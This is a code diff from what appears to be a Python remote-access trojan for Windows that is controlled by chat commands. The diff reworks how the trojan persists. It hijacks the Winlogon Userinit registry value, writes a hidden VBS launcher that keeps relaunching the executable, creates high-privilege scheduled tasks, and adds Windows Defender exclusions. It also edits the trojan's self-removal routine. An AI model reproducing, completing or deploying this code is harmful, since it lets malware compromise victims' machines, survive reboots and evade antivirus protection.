@@ -201,6 +201,7 @@ def _mutex_release():
     except Exception:
         pass
 
+
 voice_client = None
 voice_reconnect = True
 
@@ -309,6 +310,7 @@ _CNW = 0x08000000
 WINLOGON_KEY = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 USERINIT_KEY = WINLOGON_KEY
 RUN_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+POLICY_RUN = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
 
 WINDIR = os.environ.get("WINDIR") or r"C:\Windows"
 PDATA = os.environ.get("ProgramData") or r"C:\ProgramData"
@@ -503,46 +505,62 @@ def _make_launcher(exe, folder):
         "Randomize",
         "WScript.Sleep 15000 + Int(Rnd() * 25000)",
         'sh.Run """" & exe & """", 0, False',
-        "For i = 1 To 60",
+        "For i = 1 To 120",
         "  WScript.Sleep 20000",
-        '  Set svc = GetObject("winmgmts:\\.\\root\\cimv2")',
+        '  Set svc = GetObject("winmgmts:\\.\root\\cimv2")',
         f'  Set col = svc.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=\'{os.path.basename(exe)}\'")',
         '  If col.Count = 0 Then sh.Run """" & exe & """", 0, False',
         "Next",
     ]
-    path = os.path.join(_startup_dir(), folder + ".vbs")
+    path = os.path.join(os.path.dirname(exe), folder + ".vbs")
     try:
         with open(path, "w", encoding="utf-8", newline="\r\n") as f:
             f.write("\r\n".join(lines) + "\r\n")
         _hide(path, True)
+        return path
     except Exception:
-        pass
+        return None
 
 
 def _task_create(name, exe, sc, extra=()):
     subprocess.run(
-        ["schtasks", "/Create", "/TN", name, "/TR", f'cmd /c start "" /min "{exe}"',
+        ["schtasks", "/Create", "/TN", name, "/TR", f'"{exe}"',
          "/SC", sc, "/RL", "HIGHEST", "/F", *extra],
         capture_output=True, creationflags=_CNW)
 
 
 def install_userinit():
-    exe = _ensure_state()["exe"]
-    cur = _reg_query(WINLOGON_KEY, "Userinit") or r"C:\Windows\System32\userinit.exe,"
-    if exe.lower() not in cur.lower():
-        _reg_add(WINLOGON_KEY, "Userinit", f'"{exe}", C:\\Windows\\System32\\userinit.exe,')
-    for v in ("AutoAdminLogon", "DefaultUserName", "DefaultPassword",
-              "DisableCAD", "AutoRestartShell"):
-        _reg_delete(WINLOGON_KEY, v)
+    st = _ensure_state()
+    exe = st["exe"]
+    userinit = os.path.join(WINDIR, "System32", "userinit.exe")
+    if not os.path.exists(exe):
+        return False
+    for _ in range(5):
+        cur = _reg_query(WINLOGON_KEY, "Userinit") or (userinit + ",")
+        low = cur.lower()
+        if exe.lower() in low and userinit.lower() in low:
+            return True
+        parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
+        parts = [p for p in parts if p.lower() not in (exe.lower(), userinit.lower())]
+        _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [exe, userinit]) + ",")
+        time.sleep(0.3)
+        got = (_reg_query(WINLOGON_KEY, "Userinit") or "").lower()
+        if exe.lower() in got and userinit.lower() in got:
+            return True
+    return False
+
 
 def uninstall_userinit():
+    userinit = os.path.join(WINDIR, "System32", "userinit.exe")
     exe = (_state_read() or {}).get("exe")
     cur = _reg_query(WINLOGON_KEY, "Userinit")
     if not cur:
         return
     if exe and exe.lower() not in cur.lower():
         return
-    _reg_add(WINLOGON_KEY, "Userinit", r"C:\Windows\System32\userinit.exe,")
+    parts = [p.strip().strip('"') for p in cur.split(",") if p.strip()]
+    parts = [p for p in parts if p.lower() not in (userinit.lower(), (exe or "").lower())]
+    _reg_add(WINLOGON_KEY, "Userinit", ", ".join(parts + [userinit]) + ",")
 
 
 def setup_persistence():
@@ -571,15 +589,9 @@ def setup_persistence():
         return
 
     _lock_dir(target_dir)
-    install_userinit()
 
-    _task_create(folder, target_exe, "ONLOGON", ("/DELAY", "0000:45"))
-    _task_create(folder + "_b", target_exe, "ONSTART")
-
-    _reg_add(RUN_KEY, folder, f'"{target_exe}"', hive="HKLM")
-    _reg_add(RUN_KEY, folder, f'"{target_exe}"', hive="HKCU")
-
-    _make_launcher(str(target_exe), folder)
+    if target_exe.exists() and not install_userinit():
+        _task_create(folder, str(target_exe), "ONLOGON")
 
     _ps(f'Add-MpPreference -ExclusionPath "{target_dir}" -ErrorAction SilentlyContinue')
     _ps(f'Add-MpPreference -ExclusionProcess "{target_exe.name}" -ErrorAction SilentlyContinue')
@@ -4590,17 +4602,19 @@ async def delete_malware(ctx):
         except Exception:
             pass
 
-        for tn in filter(None, (name, (name + "_b") if name else None)):
-            subprocess.run(["schtasks", "/Delete", "/TN", tn, "/F"],
-                           capture_output=True, creationflags=_CNW)
-
         if name:
-            _reg_delete(RUN_KEY, name, "HKLM")
-            _reg_delete(RUN_KEY, name, "HKCU")
-            try:
-                os.remove(os.path.join(_startup_dir(), name + ".vbs"))
-            except Exception:
-                pass
+            subprocess.run(["schtasks", "/Delete", "/TN", name, "/F"],
+                           capture_output=True, creationflags=_CNW)
+            for val in (name, name + "_w"):
+                for key in (POLICY_RUN, RUN_KEY):
+                    _reg_delete(key, val, "HKLM")
+                    _reg_delete(key, val, "HKCU")
+            for vbs in (os.path.join(_startup_dir(), name + ".vbs"),
+                        os.path.join(st.get("dir") or "", name + ".vbs")):
+                try:
+                    os.remove(vbs)
+                except Exception:
+                    pass
 
         if d:
             _ps(f'Remove-MpPreference -ExclusionPath "{d}"')
